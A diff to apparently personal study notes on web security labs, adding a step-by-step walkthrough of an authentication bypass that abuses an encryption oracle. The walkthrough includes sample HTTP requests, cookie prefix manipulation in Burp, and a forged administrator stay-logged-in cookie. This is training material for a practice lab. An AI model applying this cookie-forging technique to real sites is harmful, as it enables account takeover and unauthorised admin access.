@@ -588,8 +588,39 @@
   - **Test Macro** > Ok to go back Burp
   - Burp Intruder > **GET /my-account** > Sniper > **null payloads** > **generate 412 payloads** > max 1 concurrent request
   - Store credit++ (Refresh the page)
-- Authentication bypass via encryption oracle   
+- Authentication bypass via **encryption oracle**
+  - Stay logged in and post a comment with invalid email to observe encrypted cookies
+    ```
+    Request
+    POST /post/comment   
+    Cookie: **stay-logged-in=OtQWW%2fHiUg1PdV%2bmbFJrDsS40zMw8R93BfkLz4m%2ftS4%3d**; session=bc5J7wZPyjr1xrVksvk9gfDmcAV31xRD   
+    csrf=Xmi1r3NQeRnv8Ap0dN5nlnmZkS9nbID1&postId=4&comment=comment1&name=hacker&email=**hh.hacker.com**&website=
+    
+    Response
+    GET /post?postId=4
+    Set-Cookie: **notification=7XpfTWmxSzTjCp30OO0KfLmzXaTvnJgSd8%2bOZNjIlX5xQdyGRoVrdRJSdzta%2bAJr**;
+    Body: Invalid email address: hh.hacker.com
+    ```
+  - Encrypt repeater: POST /post/comment > stay-logged-in
+  - Decrypt repeater: GET /post?postId=4 > amend notification cookie > response
+  - Create and manipulate cookies to bypass encryption prefixes
+    - copy Encrypt (stay-logged-in) and replace to Decrypt (notification) > decrypt repeater send > response found "wiener:1720796160463" > copy the timestamp
+    - modify the email param in **Encrypt repeater**: email=**administrator:1720796160463** > send > copy the notification cookie in response
+    - replace to **Decrypt** (notification) > send > response "Invalid email address: administrator:1720796160463"   (First 23 bytes prefix - "Invalid email address: ")   
 
+    - **Encrypt** (stay-logged-in) > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 23 bytes > encode as base 64 > encode as url > copy the value
+    - replace to **Decrypt** (notification) > send > response error "Input length must be multiple of 16 when decrypting with padded cipher"  (23 bytes prefix + 9 chrs = 32 + user:timestamp)
+      
+    - **Encrypt** (stay-logged-in) > add 9 chrs to **email=xxxxxxxxxadministrator:1720796160463** > send > in response cookie notification > send to decoder > decode as URL > decode as base 64 > delete first 32 bytes > encode as base 64 > encode as url > copy the value
+    - replace to **Decrypt** (notification) > send > administrator:1720796160463
+      
+    - intercept on > click home page > delete session cookie > replace stay-logged-in cookie (copy from decrypt notification %url) > forward
+      ```
+      GET / HTTP/2   
+      Cookie: stay-logged-in=%52%72%76%64%79%4c%51%74%49%67%59%41%2b%58%65%5a%37%6d%4e%33%4e%62%64%73%63%48%52%2f%61%34%49%4a%54%41%4d%74%39%38%6a%79%6e%4f%59%3d;
+      ```
+  - Gain access as an admin and perform the required action
+    
 ## Command Injection
 Content for Command Injection...
 
